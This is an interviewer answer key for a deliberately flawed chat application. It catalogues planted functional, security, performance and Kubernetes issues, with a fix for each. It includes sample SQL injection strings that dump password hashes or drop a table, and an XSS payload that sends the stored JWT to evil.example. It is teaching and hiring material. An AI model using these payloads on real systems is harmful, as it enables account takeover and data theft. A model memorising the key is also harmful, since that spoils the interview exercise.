# ChatterBox — Interviewer Answer Key

**Do not share this file or the `interviewer/` directory with candidates.**
Consider removing this directory (or the whole `.git` history of it) before
handing the repo off, or keeping it in a private fork/branch.

This lists every issue that was deliberately planted, organized by
category, with difficulty rating (Junior / Mid / Senior), file:line
references, why it matters, and the expected fix. Nothing here is
exhaustive — candidates may find real issues beyond this list (that's a
good sign, not noise); use judgement.

Difficulty is a rough guide to how experienced an engineer needs to be to
*notice* the issue unprompted, not to fix it.

---

## 1. Functional bugs

### 1.1 Case-sensitive email uniqueness → duplicate accounts (Junior)
**Where**: `backend/src/routes/auth.js` (register handler), schema in
`backend/src/db/migrations/001_init.sql` (`email VARCHAR(255) UNIQUE`).

Registration checks `WHERE email = $1` and the DB unique constraint is
case-sensitive, so `alice@x.com` and `Alice@X.com` are treated as different
accounts. Login has the same problem — a user who signs up with mixed case
and later types their email differently can appear to have "lost" their
account.

**Fix**: normalize email to lowercase before every read/write (or use a
`citext` column / `UNIQUE (lower(email))` index), and do the same
normalization in login.

### 1.2 Unstable OFFSET pagination for message history (Mid/Senior)
**Where**: `backend/src/routes/messages.js`, `GET /` handler.

Pagination is `ORDER BY created_at DESC LIMIT $2 OFFSET $3` with no
tie-breaker column. Two problems: (a) messages with identical timestamps
can be skipped or duplicated across pages since ordering isn't fully
deterministic; (b) OFFSET pagination is inherently unstable under
concurrent inserts — as new messages arrive while a user is scrolling up
through history, the offset shifts and messages get skipped or repeated.
This is the kind of bug that's hard to reproduce in a quick manual test but
real under real usage.

**Fix**: keyset/cursor pagination — `WHERE (created_at, id) < ($cursor_ts,
$cursor_id) ORDER BY created_at DESC, id DESC LIMIT $n`, using the last
row's `(created_at, id)` as the next cursor instead of an offset.

### 1.3 Unread counter never clears (Mid)
**Where**: `backend/src/sockets/index.js` (`send_message` handler
increments `unread:{userId}:{channelId}` in Redis), `backend/src/routes/messages.js`
`POST /read` — it writes to `channel_members` but never touches the Redis
key, and `GET /unread-count` just reads whatever's in Redis. Also note the
Redis key is set via `INCR` with no TTL, so it also never expires on its
own.

**Fix**: `POST /read` should reset (`DEL` or `SET ... 0`) the Redis unread
counter for that user/channel. Bonus: this is also a good spot to discuss
why storing this derived state in Redis with no invalidation contract
is risky vs. computing it from Postgres (`last_read_at` vs. `MAX(created_at)`).

### 1.4 React state mutated in place → UI doesn't update on new messages (Mid)
**Where**: `frontend/src/components/ChannelView.jsx`, `handleNewMessage`:

```js
messagesRef.current.push(message);
setMessages(messagesRef.current);
```

`setMessages` is called with the *same array reference* that was just
mutated. React bails out of the re-render for a `useState` setter call
when the new value is reference-equal (`Object.is`) to the current value,
so the message list silently fails to re-render when a socket message
arrives — until some unrelated state update (e.g. typing, switching
channels) forces a re-render and the stale-looking list "catches up" all
at once. This is a classic direct-mutation-of-state bug and is worth
asking candidates to explain *why* it happens, not just that it's wrong.

**Fix**: `setMessages((prev) => [...prev, message])`, and drop the mutable
ref.

### 1.5 Stored/reflected data rendered without sanitization creates duplicate-looking but distinct bugs
See §2.3 (XSS) — also functionally, message "formatting" was never actually
implemented (the comment claims bold/links/emoji but there's no
markdown/formatting parser), so the `dangerouslySetInnerHTML` isn't even
serving a real purpose — it's dead-end functionality with a live security
hole attached. Worth flagging in review even independent of the XSS angle.

---

## 2. Security vulnerabilities

### 2.1 SQL injection in message search (Junior/Mid — should be a gimme)
**Where**: `backend/src/routes/messages.js`, `GET /search`:

```js
const query = `SELECT ... WHERE m.channel_id = ${channelId} AND m.body ILIKE '%${q}%' ...`;
await pool.query(query);
```

Both `channelId` and `q` are interpolated directly into the SQL string.
`q` is fully attacker-controlled and unauthenticated as to content (any
logged-in user can hit this route). Trivially exploitable, e.g.
`q=%' UNION SELECT id, password_hash, created_at, id, email FROM users --`
(shape depends on column count) to exfiltrate password hashes, or
`q=x'; DROP TABLE messages; --` for destructive injection depending on
driver batching (node-postgres's simple `query()` with a plain string does
not support stacked queries by default, which is worth noting/discussing,
but UNION-based exfiltration works regardless).

**Fix**: parameterize — `WHERE m.channel_id = $1 AND m.body ILIKE $2` with
`[channelId, `%${q}%`]`.

### 2.2 IDOR — no channel/workspace membership check on message reads (Mid)
**Where**: `backend/src/routes/messages.js` — `GET /`, `GET /search`,
`GET /export` all only run `requireAuth` (proves *who* you are) and never
check that `req.user.id` is actually a member of `channelId`'s workspace or
channel. Any authenticated user can read any channel's message history —
including private channels — just by knowing/guessing a channel ID.
Concretely: `carol` (who is not a member of the seeded `exec-private`
channel) can `GET /api/channels/<exec-private id>/messages` and read it.

**Fix**: add a membership check (`SELECT 1 FROM channel_members WHERE
channel_id = $1 AND user_id = $2`) before returning data, ideally as
shared middleware reused across all three routes rather than copy-pasted.

### 2.3 Broken access control on channel deletion (Mid)
**Where**: `backend/src/routes/channels.js`, `DELETE /:channelId`. The
route comment says it's "intended for workspace admins only, enforced by
hiding the button in the UI" — and that's literally the entire
enforcement. The backend only checks `requireAuth`. Any authenticated user
who knows a channel ID (including a non-member, per §2.2) can delete it.
`requireWorkspaceRole` exists in `backend/src/middleware/auth.js` and is
never called anywhere — a good signal that this was a known TODO, not an
oversight nobody could've caught.

**Fix**: look up the channel's `workspace_id`, call
`requireWorkspaceRole(pool, workspaceId, req.user.id, ['admin'])`, 403 if
false. Also wrap the three deletes in a transaction (see §4.2).

### 2.4 Stored XSS via unsanitized message rendering (Mid/Senior)
**Where**: `frontend/src/components/MessageList.jsx`:

```jsx
<div className="message-body" dangerouslySetInnerHTML={{ __html: m.body }} />
```

`m.body` is raw user input, stored as-is server-side (no sanitization on
write in `backend/src/sockets/index.js` either) and rendered as HTML on
every client that views the channel. A message body of
`<img src=x onerror="fetch('https://evil.example/steal?t='+localStorage.getItem('chatterbox_token'))">`
is stored permanently and fires for every user who opens the channel —
combined with the JWT being stored in `localStorage` (see §2.5), this is a
full account-takeover chain, not just a defacement bug.

**Fix**: don't render user content as HTML. Render as text (React escapes
by default) or, if formatting is genuinely wanted, sanitize server-side
and/or client-side with an allowlist-based sanitizer (e.g. DOMPurify) —
never trust `dangerouslySetInnerHTML` on unsanitized user input.

### 2.5 JWT never expires (Mid)
**Where**: `backend/src/routes/auth.js`, `signToken`:
`jwt.sign({...}, config.jwt.secret)` — no `expiresIn`. A stolen token
(e.g. via the XSS above, or a leaked log) is valid forever; there's also
no logout/revocation mechanism (`logout()` on the frontend just deletes
the local copy).

**Fix**: set a reasonable `expiresIn` (e.g. `15m`–`24h` depending on
refresh strategy) and, ideally, a refresh-token flow or a server-side
revocation list for real logout.

### 2.6 Hardcoded/fallback JWT secret (Junior/Mid)
**Where**: `backend/src/config.js`:
`secret: process.env.JWT_SECRET || 'supersecretkey123'`, and that exact
value is also checked into `.env` and `k8s/configmap.yaml`. If
`JWT_SECRET` is ever unset in any environment, the app silently falls back
to a well-known value — and since it's also *literally committed to the
repo* in `.env`/the ConfigMap, anyone with repo access can forge tokens
for any user in any environment still using the default.

**Fix**: fail fast (throw at startup) if `JWT_SECRET` isn't set in
non-development environments; never commit real secrets; use a k8s
`Secret` (see §5.2), ideally sourced from a secrets manager.

### 2.7 Naive password hashing — unsalted SHA-256 (Junior/Mid)
**Where**: `backend/src/utils/password.js`:
`crypto.createHash('sha256').update(plaintext).digest('hex')`. No salt, no
work factor. This is fast to compute, which is exactly the wrong property
for password hashing — it makes offline brute-force/rainbow-table attacks
against a leaked `users` table cheap. Note `backend/src/utils/password.test.js`
passes and gives false confidence — it verifies hash/verify round-trip
correctness, not that the scheme is appropriate.

**Fix**: use bcrypt/argon2/scrypt with a proper work factor and per-user
salt (most of these libraries handle salting for you).

### 2.8 `CORS_ORIGIN=*` combined with `credentials: true` (Mid)
**Where**: `backend/src/index.js`, both the `cors()` middleware and the
Socket.IO server options; value comes from `.env` / `k8s/configmap.yaml`
(`CORS_ORIGIN=*`). This is both insecure *and* subtly broken: browsers
reject `Access-Control-Allow-Origin: *` when credentials are involved, so
depending on exactly how requests are made this either doesn't work as
intended or (if someone "fixes" it by reflecting the request origin
instead of literally sending `*`, which some CORS middleware defaults
do) becomes an any-origin-allowed-with-credentials hole.

**Fix**: set an explicit allowlist of real frontend origins per
environment; never combine wildcard origin with credentials.

### 2.9 No rate limiting on login/register (Mid)
**Where**: `backend/src/routes/auth.js` — no throttling at all on
`/login` or `/register`. Combined with weak hashing (§2.7) and no account
lockout, this is a straightforward brute-force / credential-stuffing
target.

**Fix**: rate-limit by IP and/or account (e.g. `express-rate-limit` or a
Redis-backed limiter — Redis is already in the stack), add backoff/lockout
on repeated failures.

### 2.10 Verbose error responses leak stack traces (Junior/Mid)
**Where**: `backend/src/middleware/errorHandler.js` — always returns
`{ error: err.message, stack: err.stack }`, regardless of environment.
Leaks internals (file paths, query fragments in DB errors, library
versions) to any client, which materially helps an attacker (and, in
combination with §2.1's SQL injection, can leak raw DB error text useful
for blind/error-based injection).

**Fix**: only include stack/detail when `NODE_ENV !== 'production'`; log
full detail server-side always, return a generic message to the client.

### 2.11 JWT stored in `localStorage` (Senior — design discussion)
**Where**: `frontend/src/api/client.js`, `frontend/src/state/AuthContext.jsx`
— `localStorage.setItem('chatterbox_token', token)`. Not "wrong" in
isolation, but given §2.4's XSS, it means any successful script injection
gets a durable, exfiltratable credential rather than nothing. Good
candidates should connect this to the XSS finding rather than flag it in
isolation. Worth discussing httpOnly cookie + CSRF-token alternatives and
their trade-offs, not just "always use cookies."

### 2.12 Secrets committed to the repository (Junior/Mid)
**Where**: root `.env` is committed (check `.gitignore` — it excludes
`node_modules/`, `dist/`, logs, etc., but never lists `.env`), and the same
values are duplicated in `k8s/configmap.yaml` in plaintext. See §5.2 for
the k8s-specific angle.

**Fix**: remove `.env` from the repo, add it to `.gitignore`, rotate every
credential that was ever committed (the git history still has them even
after a later `git rm`), and use `.env.example` (already present, and
already secret-free) as the template.

---

## 3. Performance issues

### 3.1 N+1 queries when listing channels (Junior/Mid)
**Where**: `backend/src/routes/workspaces.js`, `GET /:workspaceId/channels`
— loads channels, then loops and issues two more queries *per channel*
(member count, last message). For a workspace with 50 channels that's 101
round trips instead of 1-3.

**Fix**: a single query with `JOIN`/aggregate subqueries (e.g.
`COUNT(*) ... GROUP BY`, or a `LATERAL` join for last message per channel),
or at minimum batch the per-channel queries into `WHERE channel_id = ANY($1)`
calls.

### 3.2 Missing indexes (Mid)
**Where**: `backend/src/db/migrations/001_init.sql` — `messages` has no
index beyond its primary key. Every message-list/search/export query
filters on `channel_id` and orders by `created_at`; without an index,
these become sequential scans as the table grows. `channel_members` and
`workspace_members` also lack a secondary index on `user_id` for the
reverse lookup ("what channels/workspaces is this user in") direction —
only the composite PK `(channel_id, user_id)` exists, which doesn't help a
`WHERE user_id = $1` query.

**Fix**: `CREATE INDEX ON messages (channel_id, created_at DESC)`;
`CREATE INDEX ON channel_members (user_id)`; `CREATE INDEX ON
workspace_members (user_id)`.

### 3.3 Unbounded export endpoint (Mid)
**Where**: `backend/src/routes/messages.js`, `GET /export` — no `LIMIT`
at all, returns the entire channel history as one JSON response. Both a
memory/latency risk server-side and a naive client expectation (nothing
downstream streams or paginates it).

**Fix**: paginate or stream (e.g. newline-delimited JSON with chunked
transfer), or at minimum cap it and require repeated calls.

### 3.4 Global Socket.IO broadcast instead of room-scoped emit (Mid/Senior — also a security bug)
**Where**: `backend/src/sockets/index.js`, `send_message` handler:
`io.emit('new_message', message)` sends every message to every connected
socket, not just members of that channel — the client just filters
`if (message.channel_id !== channel.id) return;` locally. Two problems:
(a) performance — O(all connected clients) work and bandwidth per message
instead of O(channel members); (b) confidentiality — a private channel's
messages are sent over the wire to clients who aren't members of it; the
data already left the server before the client "politely" ignores it, so
it's fully visible in browser devtools/a proxy to anyone connected,
regardless of channel membership. This is the same root cause as §2.2 —
authorization is being done client-side instead of server-side. Strong
candidates should notice the pattern repeats across multiple layers of the
app (REST *and* sockets) rather than treating each as an isolated bug.

**Fix**: `io.to(`channel:${channelId}`).emit('new_message', message)`,
relying on the `join_channel`/`leave_channel` room membership that's
already implemented — but that join should itself be checked against real
channel membership server-side (currently `join_channel` doesn't verify
the user is actually allowed into that channel either).

---

## 4. Architecture / concurrency / infrastructure

### 4.1 In-memory presence state doesn't work with multiple replicas (Senior — the centerpiece architecture question)
**Where**: `backend/src/sockets/index.js` — `const onlineUsers = new Map()`
is per-process. `k8s/backend-deployment.yaml` runs `replicas: 3`. Because
there's no shared state or pub/sub between backend pods:

- A user's presence (`online: true/false`) is only known to the one pod
  their socket happens to be connected to; `io.emit('presence', ...)` only
  reaches clients connected to *that same pod*, so other pods' clients
  never learn this user came online/offline.
- This compounds with §3.4: `io.emit('new_message', ...)` inside one pod
  only reaches sockets connected to *that* pod, meaning users connected to
  a different replica than the message sender may not get the message
  over the socket at all (only on next poll/reload) — a correctness bug
  that only appears once you run more than one replica, i.e. it's
  invisible in local dev with `docker compose` (single backend instance)
  and only surfaces in the Kubernetes deployment.

**Fix**: this is the textbook use case for the Socket.IO Redis adapter
(`@socket.io/redis-adapter`) — Redis is already provisioned in this stack
but only used for unread counters. Wiring the adapter in lets `io.emit`/
`io.to(room).emit` fan out correctly across all pods via Redis pub/sub.
Presence itself should also move out of process memory into Redis (e.g. a
set per user of connected socket IDs, or a TTL'd heartbeat key) so any pod
can answer "is this user online" correctly.

This is a good one to have candidates *diagram* even if they don't have
time to implement it — it's as much a "can you reason about distributed
state" question as a coding one.

### 4.2 No transaction around multi-step message send (Mid/Senior)
**Where**: `backend/src/sockets/index.js`, `send_message` — inserts the
message, then separately updates `channels.last_message_at`, then loops
issuing Redis `INCR`s, then publishes to RabbitMQ, then broadcasts. None
of the Postgres writes are wrapped in a transaction. If the
`last_message_at` update fails (or the process crashes between the two
statements), the message exists but the channel's "last activity" sort
order silently goes stale — and there's no compensation/retry.

**Fix**: wrap the related Postgres writes (`INSERT INTO messages`,
`UPDATE channels`) in a single transaction (`BEGIN`/`COMMIT`, or `pool`
with a checked-out client). Separately worth discussing: the Redis
increments and RabbitMQ publish are not (and can't easily be) part of that
same transaction — candidates should be able to talk about outbox-pattern
or at-least-once/idempotent-consumer approaches rather than assuming
naive atomicity is achievable end-to-end.

### 4.3 RabbitMQ consumer acknowledges before processing (Senior)
**Where**: `backend/worker/notificationWorker.js`:

```js
channel.ack(msg);
const payload = JSON.parse(msg.content.toString());
await deliverNotification(payload);
```

The message is acked *before* `deliverNotification` runs. If the worker
crashes (or the DB lookup inside `deliverNotification` throws) after the
ack but before delivery completes, the message is gone from the queue —
RabbitMQ has no way to know delivery didn't happen, since it was already
told "done." This is exactly backwards from the point of using a durable
queue for at-least-once delivery. Compounding it: there is no `try/catch`
around the async work at all, so an exception inside the `consume`
callback becomes an unhandled promise rejection, which crashes the entire
worker process (default Node.js behavior) — taking down all in-flight
message processing on that consumer, not just the one bad message.

**Fix**: move `channel.ack(msg)` to *after* successful processing; wrap
processing in `try/catch`, and on failure either `channel.nack(msg, false,
true)` to requeue (careful: a poison message will then loop forever
without a dead-letter queue) or, better, set up a dead-letter exchange/
queue (`x-dead-letter-exchange`) so repeatedly-failing messages get routed
aside instead of blocking/crash-looping the consumer.

### 4.4 Kubernetes manifests — no probes, no resource limits, mutable image tags (Mid/Senior)
**Where**: `k8s/backend-deployment.yaml`, `k8s/frontend-deployment.yaml`,
`k8s/worker-deployment.yaml`.

- `image: chatterbox/backend:latest` — mutable tag; a rollout doesn't
  reliably know what's actually running, `kubectl rollout undo` won't work
  as expected, and different pods can silently run different code if the
  tag was repushed between pod (re)starts.
- No `resources.requests`/`resources.limits` on any container — no
  scheduling guarantees, and one runaway container can starve its
  neighbors on the node (no cgroup limits enforced).
- No `readinessProbe`/`livenessProbe` despite the backend already exposing
  `GET /health` — Kubernetes has no way to know a pod is unhealthy or
  still starting up, so it'll route traffic to broken/not-yet-ready pods
  and won't restart hung ones.
- `backend` is scaled to `replicas: 3` for a stateful-over-WebSockets
  workload with no session affinity configured in the Ingress and no
  shared state backing it (see §4.1) — the replica count itself exposes
  the architecture bug.

**Fix**: pin real, immutable image tags/digests (built in CI); add
requests/limits sized from real usage; add liveness/readiness probes
pointed at `/health` (and ideally a readiness check that also verifies DB/
Redis/RabbitMQ connectivity); fix the underlying shared-state problem
before treating horizontal scaling as safe.

### 4.5 Postgres data on `emptyDir`, not a PersistentVolumeClaim (Mid)
**Where**: `k8s/postgres.yaml` — `volumes: - name: pgdata; emptyDir: {}`.
`emptyDir` is tied to the pod's lifetime on that node; a pod
reschedule/restart/node drain wipes the entire database. There's also no
backup story at all.

**Fix**: use a `PersistentVolumeClaim` bound to real durable storage (and
in most real deployments, run Postgres via a managed service or an
operator/StatefulSet rather than a bare Deployment at all — good prompt
for "would you run this Deployment in prod").

### 4.6 Dockerfiles: runs as root, poor layer caching, no multi-stage build (Junior/Mid)
**Where**: `backend/Dockerfile`, `frontend/Dockerfile` — both `FROM
node:18` (full image, not `-slim`/`-alpine`), `COPY . .` before `RUN npm
install` (busts the dependency-install layer cache on every source change,
slowing every build), no non-root `USER`, `npm install` instead of `npm
ci` (not reproducible against the lockfile), no multi-stage build (dev
dependencies and build tooling ship in the final image), and the frontend
image runs `npm run dev` (a dev server) rather than building static
assets and serving them.

**Fix**: copy `package*.json` and run `npm ci` before copying the rest of
the source; add a non-root `USER`; use `-slim` base images; multi-stage
build for the frontend (`vite build` → serve `dist/` via nginx or similar)
rather than shipping the Vite dev server.

### 4.7 `.dockerignore` doesn't exclude `.env` (Junior/Mid)
**Where**: `backend/.dockerignore`, `frontend/.dockerignore` — both list
`node_modules`, logs, `.git`, but not `.env`. Combined with `COPY . .` in
the Dockerfiles, a locally-present `.env` (which, per §2.12, exists and
has real-looking secrets in this repo) gets baked into the image layer
history — visible to anyone who can pull/inspect the image, even if a
later layer "deletes" it.

**Fix**: add `.env` (and `.env.*` except `.env.example`) to
`.dockerignore`; secrets should be injected at runtime (env vars from a
k8s `Secret`), never baked into an image.

---

## 5. Suggested interview flow

This is intentionally more than fits in one interview. Pick a subset based
on time and the role's level; you don't need to cover every section above.

- **Warm-up / breadth pass (~15–20 min)**: give them the running app and
  the README's 4 prompts, let them explore with their own tools/AI. Look
  for: do they actually run the app and try to break it, or only read
  code? Do they check the backend *and* the k8s/Docker layer, or stop at
  the app code?
- **Depth pass (~20–30 min)**: pick 1-2 findings and go deep — "walk me
  through exactly how you'd exploit §2.2", "why does §4.1 only show up in
  k8s and not in `docker compose`", "what would you change first if this
  had to handle 10x traffic tomorrow."
- **Fix + verify**: have them actually patch at least one bug and explain
  how they'd verify the fix (test, manual repro steps, etc.) — §1.4 and
  §2.1 are both cheap to demonstrate a before/after on.
- **Architecture discussion**: §4.1 and §4.3 are good no-code, whiteboard-
  style discussions if time is short — they test systems thinking
  independent of typing speed.

A candidate who finds and articulates §2.2 + §3.4 together (same root
cause — authorization enforced client-side, not server-side, in two
different layers of the app) is showing pattern recognition that's worth
more signal than someone who finds more issues but treats each in
isolation.
